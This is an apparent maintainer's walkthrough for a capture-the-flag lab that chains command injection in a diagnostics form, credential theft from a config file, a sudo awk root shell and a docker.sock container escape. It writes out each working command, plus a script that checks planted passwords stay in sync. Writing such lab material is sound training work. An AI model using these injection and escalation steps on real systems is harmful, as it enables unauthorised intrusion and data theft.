# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. The NetDiag console posts a `host` and a `tool`
  to `diag.php`.
- `http://TARGET:8080/robots.txt` and the HTML comment on the index note that
  `diag.php` shells out to ping/nslookup/whois and that the host field is not
  escaped.

## Stage 1 - OS command injection

- `diag.php` builds `<tool> <host> 2>&1` and passes it to `shell_exec` with no
  validation. The `host` field is injectable.
- Confirm with a shell metacharacter:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=127.0.0.1; id'
  ```

- The response includes `uid=33(www-data)`, confirming command execution as the
  web user.

## Stage 2 - First inner flag (www-data)

- The injection is a usable web shell. Read the flag owned by `www-data`:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=; cat /var/www/user_flag.txt'
  ```

- That prints the first `FLAG{...}`.

## Stage 3 - Recover a credential, pivot to diag (inner SSH)

- Enumerate as `www-data`. The application config is world-readable:

  ```bash
  curl -s -X POST http://TARGET:8080/diag.php \
    --data-urlencode 'tool=ping' --data-urlencode 'host=; cat /opt/netdiag/scheduler.conf'
  ```

- It leaks the diagnostics operator credential (`diag` and its password). The
  web container's SSH is published on port 23:

  ```bash
  ssh diag@TARGET -p 23
  cat ~/diag.txt
  ```

- That gives the second `FLAG{...}`.

## Stage 4 - diag to inner root (sudo awk, GTFOBins)

- `sudo -l` shows `diag` may run `/usr/bin/awk` as root with NOPASSWD.
- Spawn a root shell (GTFOBins):

  ```bash
  sudo awk 'BEGIN{system("/bin/bash")}'
  cat /root/root.txt
  ```

- That gives the inner root flag, `SHELL_FLAG{...}`.

## Stage 5 - Break out to the outer host (both MAIN_FLAG)

- As root in the web container, note `/var/run/docker.sock` is mounted and a
  static `docker` client is present.
- Read the outer root flag by mounting the outer host filesystem. Reuse an image
  the outer engine already has from the inner build (`php:8.4-apache` is the web
  image's base and is already cached), so the step needs no play-time pull:

  ```bash
  docker run --rm -v /:/host php:8.4-apache cat /host/root/root.txt
  ```

  Any image already present in the outer engine works here; avoid `alpine`, which
  the outer engine never pulled and would require Hub access mid-solve. That
  prints the outer `MAIN_FLAG{...}` root flag.

- The same mount is a full outer-root primitive, so the outer user flag is
  directly readable too:

  ```bash
  docker run --rm -v /:/host php:8.4-apache cat /host/home/netops/user.txt
  ```

  That prints the outer `MAIN_FLAG{...}` user flag.

- For realism, the deploy notes readable only by inner root leak the outer host
  account, which logs in over the outer-host SSH port as `netops`:

  ```bash
  cat /root/deploy-notes.txt
  ssh netops@TARGET -p 22
  cat ~/user.txt
  ```

  This recovers the same outer user flag by the intended narrative route. It is a
  realism flourish, not a requirement (see Notes).

## Notes and red herrings

- `nslookup` and `whois` are equally injectable; `ping` is just the default
  option. In an unprivileged container `ping` itself may fail to open a raw
  socket, but the injected command after `;` still runs.
- The mounted `docker.sock` is a full outer-root primitive: a container started
  with `-v /:/host` runs as uid 0 on the outer host and reads any file
  regardless of mode. Both outer flags (`/root/root.txt` and
  `/home/netops/user.txt`) are therefore directly readable through the mount.
  The `deploy-notes.txt` -> `netops` password -> outer SSH stage recovers the
  same user flag by the intended narrative route, but it gates nothing; it is a
  realism flourish, not a requirement.

## Maintenance checks (credential sync)

Two credentials are each stored in two files: a login side (where the account is
created) and a leaked side (what the player recovers). A mismatch builds green
but dead-ends the pivot, so keep each pair in sync:

- `diag` password: `docker-web/web.Dockerfile` (chpasswd) and
  `docker-web/config/scheduler.conf`.
- `netops` password: `Dockerfile` (chpasswd) and
  `docker-web/config/deploy-notes.txt`.

From the repo root, assert each login-side password appears in its leaked-side
partner (the check reads both passwords from source, so it needs no update on
rotation):

```bash
diag_pw=$(grep chpasswd docker-web/web.Dockerfile | grep -oE "diag:[^']+" | cut -d: -f2)
netops_pw=$(grep chpasswd Dockerfile | grep -oE 'netops:[^"]+' | cut -d: -f2)
grep -qF "$diag_pw" docker-web/config/scheduler.conf   && echo "diag password in sync"   || echo "diag password DESYNCED"
grep -qF "$netops_pw" docker-web/config/deploy-notes.txt && echo "netops password in sync" || echo "netops password DESYNCED"
```
